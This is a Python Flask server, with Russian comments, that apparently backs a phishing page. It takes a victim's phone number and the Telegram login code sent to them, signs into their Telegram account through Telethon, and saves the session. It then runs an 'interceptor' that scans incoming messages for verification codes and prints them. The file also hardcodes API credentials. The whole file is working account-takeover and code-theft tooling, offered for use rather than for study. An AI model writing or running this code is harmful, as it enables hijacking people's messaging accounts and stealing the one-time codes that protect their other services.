from flask import Flask, request, jsonify

from flask_cors import CORS

from telethon.sync import TelegramClient

from telethon import events

from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

import asyncio

import os

import logging



# Настройка логирования

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')



app = Flask(__name__)

CORS(app)



# Конфигурация

api_id = 9348118

api_hash = 'b6e1802b599d8f4fb8716fcd912f20f2'



# Глобальные переменные

active_clients = {}

pending_authorizations = {}



def run_async(func, *args):

    """Запускает асинхронную функцию в отдельном потоке"""

    loop = asyncio.new_event_loop()

    asyncio.set_event_loop(loop)

    try:

        result = loop.run_until_complete(func(*args))

        return result

    except Exception as e:

        return {'status': 'error', 'message': str(e)}

    finally:

        loop.close()



async def start_interception(phone):

    """Запускает перехват сообщений для номера"""

    try:

        session_file = f'session_{phone}'

        client = TelegramClient(session_file, api_id, api_hash)

        

        # Настраиваем обработчик сообщений

        @client.on(events.NewMessage(incoming=True))

        async def handler(event):

            message = event.message.message

            sender = await event.get_sender()

            

            # Ищем коды в сообщениях

            import re

            code_patterns = [

                r'\b\d{5}\b',

                r'код[: ]*\d{5}',

                r'code[: ]*\d{5}', 

                r'verification[: ]*\d{5}',

                r'\b\d{4,6}\b'

            ]

            

            found_codes = []

            for pattern in code_patterns:

                matches = re.findall(pattern, message, re.IGNORECASE)

                if matches:

                    for match in matches:

                        numbers = re.findall(r'\d+', str(match))

                        found_codes.extend(numbers)

            

            if found_codes:

                print(f"\n🎯 ПЕРЕХВАЧЕН КОД ДЛЯ {phone}!")

                print(f"👤 От: {getattr(sender, 'first_name', 'Unknown')}")

                print(f"💬 Текст: {message}")

                print(f"🔢 Коды: {', '.join(found_codes)}")

                print("─" * 50)

        

        # Запускаем клиента

        await client.start()

        active_clients[phone] = client

        

        me = await client.get_me()

        print(f"✅ Перехватчик запущен для {phone} ({me.first_name})")

        

        # Запускаем прослушивание в фоне

        asyncio.create_task(client.run_until_disconnected())

        

        return {'status': 'success', 'account': f"{me.first_name} {me.last_name or ''}"}

        

    except Exception as e:

        print(f"❌ Ошибка запуска перехватчика: {e}")

        return {'status': 'error', 'message': str(e)}



async def authorize_phone_number(phone, code=None):

    """Авторизует номер телефона в Telegram"""

    try:

        session_file = f'session_{phone}'

        client = TelegramClient(session_file, api_id, api_hash)

        

        await client.connect()

        

        # Проверяем существующую сессию

        if await client.is_user_authorized():

            me = await client.get_me()

            logging.info(f"✅ Сессия существует для {phone}")

            await client.disconnect()

            

            # Запускаем перехват

            result = await start_interception(phone)

            return result

        

        # Если сессии нет, авторизуемся

        if not code:

            # Запрашиваем код

            sent_code = await client.send_code_request(phone)

            pending_authorizations[phone] = {

                'client': client,

                'phone_code_hash': sent_code.phone_code_hash

            }

            return {'status': 'code_required', 'message': 'Code sent to Telegram'}

        

        else:

            # Вводим код

            if phone not in pending_authorizations:

                return {'status': 'error', 'message': 'No pending authorization'}

            

            phone_code_hash = pending_authorizations[phone]['phone_code_hash']

            

            try:

                # Пытаемся войти с кодом

                await client.sign_in(

                    phone=phone,

                    code=code,

                    phone_code_hash=phone_code_hash

                )

                

                # Успешный вход

                me = await client.get_me()

                logging.info(f"✅ Успешный вход: {me.first_name}")

                

                # Очищаем временные данные

                if phone in pending_authorizations:

                    del pending_authorizations[phone]

                

                await client.disconnect()

                

                # Запускаем перехватчик

                result = await start_interception(phone)

                return result

                

            except SessionPasswordNeededError:

                return {'status': 'password_required', 'message': '2FA password needed'}

            except PhoneCodeInvalidError:

                return {'status': 'error', 'message': 'Invalid code'}

            except Exception as e:

                return {'status': 'error', 'message': str(e)}

    

    except Exception as e:

        logging.error(f"❌ Ошибка авторизации: {e}")

        return {'status': 'error', 'message': str(e)}



@app.route('/request-code', methods=['POST', 'OPTIONS'])

def request_code():

    """Получает номер и начинает авторизацию"""

    if request.method == 'OPTIONS':

        return '', 200

        

    try:

        data = request.json

        phone = data.get('phone', '').strip()

        

        if not phone:

            return jsonify({'status': 'error', 'message': 'No phone provided'})

        

        if not phone.startswith('+'):

            phone = '+' + phone

        

        logging.info(f"📱 Получен номер: {phone}")

        

        # Начинаем авторизацию

        result = run_async(authorize_phone_number, phone)

        return jsonify(result)

        

    except Exception as e:

        logging.error(f"❌ Ошибка в /request-code: {e}")

        return jsonify({'status': 'error', 'message': str(e)})



@app.route('/verify-code', methods=['POST', 'OPTIONS'])

def verify_code():

    """Получает код и завершает авторизацию"""

    if request.method == 'OPTIONS':

        return '', 200

        

    try:

        data = request.json

        code = data.get('code', '').strip()

        phone = data.get('phone', '').strip()

        

        if not code or not phone:

            return jsonify({'status': 'error', 'message': 'No code or phone provided'})

        

        if not phone.startswith('+'):

            phone = '+' + phone

        

        logging.info(f"🔐 Получен код для {phone}: {code}")

        

        # Завершаем авторизацию

        result = run_async(authorize_phone_number, phone, code)

        return jsonify(result)

        

    except Exception as e:

        logging.error(f"❌ Ошибка в /verify-code: {e}")

        return jsonify({'status': 'error', 'message': str(e)})



@app.route('/status', methods=['GET'])

def status():

    """Статус сервера"""

    return jsonify({

        'status': 'running',

        'active_clients': len(active_clients),

        'pending_auths': len(pending_authorizations)

    })



if __name__ == '__main__':

    print("🚀 TELEGRAM АВТО-БОТ ЗАПУЩЕН!")

    print("📍 Сервер: http://localhost:5000")

    print("📱 Бот автоматически вводит номера и коды в Telegram")

    print("🎯 И сразу запускает перехватчик сообщений!")

    

    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
